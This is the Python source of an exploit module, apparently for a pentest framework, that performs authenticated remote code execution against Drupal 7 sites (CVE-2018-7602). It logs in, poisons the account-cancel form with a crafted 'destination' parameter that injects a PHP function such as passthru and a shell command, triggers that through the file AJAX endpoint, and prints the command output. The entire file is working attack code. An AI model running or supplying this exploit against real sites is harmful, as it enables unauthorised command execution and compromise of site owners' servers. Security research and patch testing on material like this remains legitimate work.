#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> AUTOHEADER >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
#
#   Title : CVE-2018-7602
#   Author: pimps
#   Information: This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 <= 7.58
#           using an valid account and poisoning the cancel account form (user_cancel_confirm_form)
#           with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax).
#
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< AUTOHEADER <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

import logging
from bs4 import BeautifulSoup
from hmc.modules import Module, Argument
from urllib.parse import urlparse

log = logging.getLogger("hmc")

class Drupalgeddon3(Module):
	module_name = "drupalgeddon3"
	module_desc = "Authenticated RCE on Drupal 7 <= 7.57 (CVE-2018-7602)"
	module_auth = "Hatsu"

	module_args = [
		Argument("target", desc="URL of target Drupal site (ex: http://target.com/)"),
		Argument("node_id", desc="Node to target"),
		Argument("username", "-u", "--username", default="", desc="Username"),
		Argument("password", "-p", "--password", default="", desc="Password"),
		Argument("command", "-c", "--command", default="id", desc="Command to execute (default = id)"),
		Argument("function","-f", "--function", default="passthru", desc="Function to use as attack vector (default = passthru)")
	]

	async def execute(self, target: str, username: str, password: str, command: str, function: str, node_id: str):
		hostname = urlparse(target).hostname
		self.env.connect(hostname)

		log.debug("[*] Creating a session using the provided credential...")

		get_params = {
			'q':'user/login'
		}

		post_params = {
			'form_id':'user_login',
			'name': username,
			'pass' : password,
			'op':'Log in'
		}

		r = await self.env.post(target, params=get_params, data=post_params)
		soup = BeautifulSoup(r.body, "html.parser")
		user_id = soup.find_all('a')[-2].get('href')

		if ("?q=" in user_id):
			user_id = user_id.split("=")[1]

		if(user_id):
			log.debug('[*] User ID found: ' + user_id)

		log.debug('[*] Poisoning a form using \'destination\' and including it in cache.')

		get_params = {
			'q': user_id + '/cancel'
		}

		r = await self.env.get(target, params=get_params)
		soup = BeautifulSoup(r.body, "html.parser")
		form = soup.find('form', {'id': 'user-cancel-confirm-form'})
		form_token = form.find('input', {'name': 'form_token'}).get('value')

		get_params = {
			'q':f'node/{node_id}/delete',
			'destination':f'node?q[%2523][]={function}%26q[%2523type]=markup%26q[%2523markup]={command}'
		}

		post_params = {
			'form_id':'user_cancel_confirm_form',
			'form_token': form_token,
			'_triggering_element_name':'form_id',
			'op':'Cancel account'
		}

		r = await self.env.post(target, params=get_params, data=post_params)
		soup = BeautifulSoup(r.body, "html.parser")

		try:
			form = soup.find('form', {'id': 'user-pass'})
			form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')

			if form_build_id:
				get_params = {
					'q':f'file/ajax/actions/cancel/%23options/path/{form_build_id}'
				}

				post_params = {
					'form_build_id':form_build_id
				}

				r = await self.env.post(target+'/drupal', params=get_params, data=post_params)
				parsed_result = r.body.split('[{"command":"settings"')[0]

				print(parsed_result)
			else:
				self.log_failure("This target is not vulnerable !")
		except:
			self.log_failure("ERROR: Something went wrong.")

		await self.env.disconnect(hostname)
